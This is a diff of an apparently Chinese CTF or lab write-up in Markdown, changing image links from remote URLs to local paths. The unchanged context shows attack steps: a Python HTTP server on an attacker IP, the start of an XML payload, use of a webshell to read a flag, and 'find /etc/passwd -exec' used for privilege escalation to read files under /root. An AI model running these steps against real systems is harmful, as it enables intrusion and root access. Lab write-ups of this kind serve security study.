@@ -2,7 +2,7 @@
 
 
 
-![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704108928013-14fbfa1f-1265-4ae1-a6bc-2ca780db1382.png)![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704108977359-d615b01a-f499-4eee-aaa0-20045b409d0e.png)
+![](../../../../images/2aa0f2c8e078f4f50550dd1ed1c581e1.png)![](../../../../images/85bc514e32552c3c7c854e9a41a85a74.png)
 
 # 环境
 ```bash
@@ -13,7 +13,7 @@ docker-compose up -d
 ```
 
 # 流程
-![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704114186494-371aef67-fb56-4040-9261-5d89fce2e479.png)
+![](../../../../images/090465ec9b55d4c3ab7e9dc9e0f9aa5e.png)
 
 ```bash
 https证书查看
@@ -36,7 +36,7 @@ python -m SimpleHTTPServer 80      192.168.147.1
 
 ```
 
-![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704197088817-8236258a-b91a-4e7b-946c-d8ad95641fc1.png)上图图一
+![](../../../../images/f56e1af21b3ce10e584a0f57bb9d39da.png)上图图一
 
 ```bash
 <?xml version="1.0" encoding="UTF-8"?>
@@ -46,7 +46,7 @@ python -m SimpleHTTPServer 80      192.168.147.1
 ```
 
 连上webshell，查看上一级获得key7  
-![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704204013256-a6a44fca-9fc8-480c-b3d4-5a1219288cbe.png)![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704204130725-6f049a9c-3964-4ff7-a7e0-d1ef224de198.png)
+![](../../../../images/0bb9a8ad71b0fd4a26555da1b7f6a77d.png)![](../../../../images/dc4488dfa995b4585979b6d133555c34.png)
 
 ```bash
 find /etc/passwd -exec whoami \;
@@ -54,5 +54,5 @@ find /etc/passwd -exec ls /root\;
 find /etc/passwd -exec cat /root/key8.cisp \;
 ```
 
-![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704204413835-6352a4db-a8ae-4ea1-898c-d13d828ff3ec.png)
+![](../../../../images/da44e7d1aaf780c9ac2fc8e38ac3a106.png)
 
